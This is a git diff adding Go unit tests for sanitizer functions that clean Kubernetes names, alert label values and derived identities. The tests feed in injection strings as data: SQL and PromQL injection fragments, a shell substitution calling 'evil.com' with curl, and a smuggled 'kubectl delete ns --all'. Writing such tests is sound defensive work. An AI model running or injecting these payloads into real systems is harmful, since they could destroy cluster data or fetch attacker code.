@@ -196,3 +196,81 @@ func TestFiringAlerts_Empty(t *testing.T) {
 		t.Errorf("FiringAlerts() returned %d alerts, want 0", len(firing))
 	}
 }
+
+func TestSanitizeK8sName_ValidNames(t *testing.T) {
+	valid := []string{"my-app", "postgresql", "cilium", "data-import", "app-0", "a"}
+	for _, name := range valid {
+		got := SanitizeK8sName(name)
+		if got != name {
+			t.Errorf("SanitizeK8sName(%q) = %q, want unchanged", name, got)
+		}
+	}
+}
+
+func TestSanitizeK8sName_Sanitizes(t *testing.T) {
+	tests := []struct {
+		input string
+		want  string
+	}{
+		{"MyApp", "myapp"},
+		{"my_app", "my-app"},
+		{`my";DROP TABLE`, "my--drop-table"},
+		{"", "unknown"},
+		{"---", "unknown"},
+		{"UPPER-CASE", "upper-case"},
+	}
+	for _, tc := range tests {
+		got := SanitizeK8sName(tc.input)
+		if got != tc.want {
+			t.Errorf("SanitizeK8sName(%q) = %q, want %q", tc.input, got, tc.want)
+		}
+	}
+}
+
+func TestSanitizeLabelValue_ValidValues(t *testing.T) {
+	valid := []string{"KubePodCrashLooping", "HighErrorRate", "my-metric.total", "alert_name"}
+	for _, val := range valid {
+		got := SanitizeLabelValue(val)
+		if got != val {
+			t.Errorf("SanitizeLabelValue(%q) = %q, want unchanged", val, got)
+		}
+	}
+}
+
+func TestSanitizeLabelValue_Sanitizes(t *testing.T) {
+	tests := []struct {
+		input string
+		want  string
+	}{
+		{`alert"} or 1=1 {`, "alertor11"},
+		{"", "unknown"},
+		{`$(curl evil.com)`, "curlevil.com"},
+	}
+	for _, tc := range tests {
+		got := SanitizeLabelValue(tc.input)
+		if got != tc.want {
+			t.Errorf("SanitizeLabelValue(%q) = %q, want %q", tc.input, got, tc.want)
+		}
+	}
+}
+
+func TestDeriveIdentity_InjectionPrevented(t *testing.T) {
+	labels := map[string]string{
+		"namespace":  `default"} or vector(1) {ns="`,
+		"deployment": `app"; kubectl delete ns --all`,
+		"alertname":  `FakeAlert"} / ignoring() group_left() up{`,
+	}
+
+	id := DeriveIdentity(labels)
+
+	// All values should be sanitized — no query/shell metacharacters
+	if id.Namespace == labels["namespace"] {
+		t.Error("namespace should have been sanitized")
+	}
+	if id.Name == labels["deployment"] {
+		t.Error("name should have been sanitized")
+	}
+	if id.AlertName == labels["alertname"] {
+		t.Error("alertname should have been sanitized")
+	}
+}
